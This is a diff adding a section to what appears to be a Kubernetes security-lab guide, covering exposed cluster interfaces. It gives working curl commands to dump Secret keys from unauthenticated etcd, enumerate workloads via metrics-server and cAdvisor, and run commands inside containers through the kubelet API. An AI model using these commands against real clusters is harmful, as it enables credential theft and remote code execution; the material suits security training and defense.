@@ -163,6 +163,67 @@ curl -sk https://NODE_IP:6443/version
 
 Stop the port-forward with `Ctrl+C` when done.
 
+## Other Sensitive Interfaces
+
+Beyond the Kubernetes Dashboard, several other cluster components are valuable targets when exposed without authentication.
+
+### etcd (port 2379)
+
+etcd stores the entire cluster state including secrets. If reachable, an attacker can read all keys:
+
+```bash
+# Replace ETCD_IP with the node IP where etcd is running (typically the control-plane node)
+# Check if etcd is accessible
+curl -sk https://ETCD_IP:2379/version
+
+# If etcd is configured without client cert verification, enumerate keys:
+curl -sk https://ETCD_IP:2379/v3/kv/range \
+  -X POST -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHMv"}' | python3 -m json.tool | head -30
+```
+
+> The base64 value `L3JlZ2lzdHJ5L3NlY3JldHMv` decodes to `/registry/secrets/` — the prefix where Kubernetes stores all Secret objects in etcd. Access here means full credential theft.
+
+### metrics-server
+
+metrics-server exposes CPU and memory usage for nodes and pods. While not a direct exploit path, it reveals workload names, namespaces, and resource consumption patterns:
+
+```bash
+# From inside a pod or via kubectl proxy
+curl -sk https://kubernetes.default.svc/apis/metrics.k8s.io/v1beta1/pods \
+  -H "Authorization: Bearer $TOKEN" | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace}'
+
+# Node-level metrics
+curl -sk https://kubernetes.default.svc/apis/metrics.k8s.io/v1beta1/nodes \
+  -H "Authorization: Bearer $TOKEN" | jq '.items[] | {name: .metadata.name, cpu: .usage.cpu}'
+```
+
+### Kubelet API (port 10250)
+
+The kubelet management API allows listing pods on a node and executing commands inside them. For a full walkthrough, see [Access Kubelet API](../access-kubelet-api/README.md).
+
+```bash
+# Probe the kubelet — list all pods running on this node
+curl -sk https://NODE_IP:10250/pods | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace}' | head -20
+
+# Execute a command in a container via kubelet (if anonymous auth is enabled)
+curl -sk -X POST "https://NODE_IP:10250/run/default/TARGET_POD/TARGET_CONTAINER" \
+  -d "cmd=id"
+```
+
+### cAdvisor (port 4194 / kubelet :10250/metrics/cadvisor)
+
+cAdvisor provides per-container resource usage and performance metrics. In older clusters it ran on a dedicated port (4194); in modern clusters it is available through the kubelet:
+
+```bash
+# Via kubelet endpoint
+curl -sk https://NODE_IP:10250/metrics/cadvisor | head -50
+
+# Legacy standalone port (Kubernetes < 1.12)
+curl -s http://NODE_IP:4194/api/v1.3/containers | python3 -m json.tool | head -30
+```
+
+> cAdvisor data reveals container names, image digests, and resource limits — useful for fingerprinting workloads and identifying high-value targets.
+
 ## Cleanup
 
 ```bash
